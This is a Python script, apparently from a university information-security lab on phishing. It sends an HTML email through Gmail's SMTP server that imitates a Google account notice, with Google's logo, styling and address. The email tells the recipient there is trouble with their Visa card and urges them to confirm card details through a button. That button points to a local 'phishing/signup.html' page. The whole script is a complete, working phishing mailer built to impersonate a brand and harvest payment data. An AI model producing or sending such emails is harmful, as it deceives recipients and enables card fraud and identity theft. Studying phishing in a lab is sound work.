import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "redacted_sender_email" 
sender_password = "sender_password"    
receiver_email = "redacted_receiver"

subject = "Payment Method Action Required"
body = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="format-detection" content="email=no">
  <meta name="format-detection" content="date=no">

  <style nonce="Oi7ry40S-vbVmzEvpJ4vsw">
    .awl a {
      color: #FFFFFF;
      text-decoration: none;
    }

    .abml a {
      color: #000000;
      font-family: Roboto-Medium, Helvetica, Arial, sans-serif;
      font-weight: bold;
      text-decoration: none;
    }

    .adgl a {
      color: rgba(0, 0, 0, 0.87);
      text-decoration: none;
    }

    .afal a {
      color: #b0b0b0;
      text-decoration: none;
    }

    @media screen and (min-width: 600px) {
      .v2sp {
        padding: 6px 30px 0;
      }

      .v2rsp {
        padding: 0 10px;
      }

      .mdv2rw {
        padding: 40px 40px;
      }
    }
  </style>

  <link
    href="//fonts.googleapis.com/css?family=Google+Sans"
    rel="stylesheet"
    type="text/css"
    nonce="Oi7ry40S-vbVmzEvpJ4vsw"
  >
</head>

<body style="margin:0; padding:0;" bgcolor="#FFFFFF">

  <table
    width="100%"
    height="100%"
    style="min-width:348px;"
    border="0"
    cellspacing="0"
    cellpadding="0"
    lang="en"
  >
    <tr height="32" style="height:32px;">
      <td></td>
    </tr>

    <tr align="center">
      <td>

        <!-- Email schema -->
        <div itemscope itemtype="//schema.org/EmailMessage">
          <div itemscope itemprop="action" itemtype="//schema.org/ViewAction">
            <link itemprop="url" href="LINK">
            <meta itemprop="name" content="Review Activity">
          </div>
        </div>

        <table
          border="0"
          cellspacing="0"
          cellpadding="0"
          style="padding-bottom:20px; max-width:516px; min-width:220px;"
        >
          <tr>
            <td width="8" style="width:8px;"></td>

            <td>

              <!-- Main card -->
              <div
                class="mdv2rw"
                align="center"
                style="
                  border-style:solid;
                  border-width:thin;
                  border-color:#dadce0;
                  border-radius:8px;
                  padding:40px 20px;
                "
              >

                <img
                  src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"
                  width="74"
                  height="24"
                  aria-hidden="true"
                  style="margin-bottom:16px;"
                  alt="Google"
                >

                <div
                  style="
                    font-family:'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
                    border-bottom:thin solid #dadce0;
                    color:rgba(0,0,0,0.87);
                    line-height:32px;
                    padding-bottom:24px;
                    text-align:center;
                    word-break:break-word;
                  "
                >

                  <div style="font-size:24px;">
                    Please confirm your card details
                  </div>

                  <table align="center" style="margin-top:8px;">
                    <tr style="line-height:normal;">
                      <td align="right" style="padding-right:8px;">
                        
                      </td>

                      <td>
                        <a
                          style="
                            font-family:'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
                            color:rgba(0,0,0,0.87);
                            font-size:14px;
                            line-height:20px;
                          "
                        >""" + receiver_email + """
                          
                        </a>
                      </td>
                    </tr>
                  </table>

                </div>

                <!-- Message -->
                <div
                  style="
                    font-family:Roboto-Regular, Helvetica, Arial, sans-serif;
                    font-size:14px;
                    color:rgba(0,0,0,0.87);
                    line-height:20px;
                    padding-top:20px;
                    text-align:center;
                  "
                >
                 It seems we are having trouble with your registered payment method Visa 4*** **** **** ****. Please confirm your card details using the button below.

                  <!-- Button -->
                  <div style="padding-top:32px; text-align:center;">
                    <a
                      href="file:///Users/rozmarin/projects/infsec1/lab4/phishing/signup.html"
                      target="_blank"
                      rel="noopener noreferrer"
                      style="
                        font-family:'Google Sans Flex','Google Sans Text','Google Sans','Noto Sans',Arial,Helvetica,sans-serif;
                        line-height:16px;
                        color:#ffffff;
                        font-weight:500;
                        text-decoration:none;
                        font-size:14px;
                        display:inline-block;
                        padding:12px 24px;
                        background-color:#0b57d0;
                        border-radius:9999px;
                        min-width:64px;
                      "
                    >
                      Confirm payment details
                    </a>
                  </div>
                </div>

              </div>

              <!-- Security activity link -->
              <div
                style="
                font-family: Roboto-Regular, sans-serif;
                  padding-top:20px;
                  font-size:12px;
                  line-height:16px;
                  color:#5f6368;
                  letter-spacing:0.3px;
                  text-align:center;
                "
              >
                You can also see security activity at<br>

                <a
                  href="https://myaccount.google.com/notifications"
                  style="text-decoration:none; color:#4285F4;"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  https://myaccount.google.com/notifications
                </a>
              </div>

              <!-- Footer -->
              <div style="text-align:left;">
                <div
                  style="
                    font-family:Roboto-Regular, Helvetica, Arial, sans-serif;
                    color:rgba(0,0,0,0.54);
                    font-size:11px;
                    line-height:18px;
                    padding-top:12px;
                    text-align:center;
                  "
                >
                  <div>
                    You received this email to let you know about important
                    changes to your Google Account and services.
                  </div>

                  <div style="direction:ltr;">
                    © 2026 Google LLC,
                    <a
                      class="afal"
                      style="
                        font-family:Roboto-Regular, Helvetica, Arial, sans-serif;
                        color:rgba(0,0,0,0.54);
                        font-size:11px;
                        line-height:18px;
                        text-align:center;
                        text-decoration:none;
                      "
                    >
                      1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
                    </a>
                  </div>
                </div>
              </div>

            </td>

            <td width="8" style="width:8px;"></td>
          </tr>
        </table>

      </td>
    </tr>

    <tr height="32" style="height:32px;">
      <td></td>
    </tr>
  </table>

</body>
</html>

"""

# Set up the MIME
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject


# Attach the body with the HTML content
message.attach(MIMEText(body, "html"))


# Send the email
try:
   # Establish a secure session with the server
   server = smtplib.SMTP(smtp_server, smtp_port)
   server.starttls()  # Secure the connection
   server.login(sender_email, sender_password)  # Log into the email server
   text = message.as_string()
   server.sendmail(sender_email, receiver_email, text)  # Send the email
   print("Email sent successfully!")
except Exception as e:
   print(f"Error sending email: {e}")
finally:
   server.quit()

